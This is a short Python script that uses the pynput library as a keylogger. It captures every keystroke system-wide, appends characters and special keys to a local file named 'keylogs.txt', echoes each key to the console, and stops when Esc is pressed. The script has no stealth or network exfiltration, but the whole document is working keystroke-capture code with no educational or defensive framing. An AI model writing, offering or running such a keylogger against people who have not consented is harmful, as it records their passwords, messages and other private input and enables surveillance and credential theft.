from pynput import keyboard
import os

def on_press(key):
    try:
        char = key.char
        with open('keylogs.txt', 'a') as f:
            f.write(char)
        print(f'Key {char} pressed')  # Debug print statement
    except AttributeError:
        special_key = str(key)
        with open('keylogs.txt', 'a') as f:
            f.write(special_key + '\n')
        print(f'Special key {special_key} pressed')  # Debug print statement

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()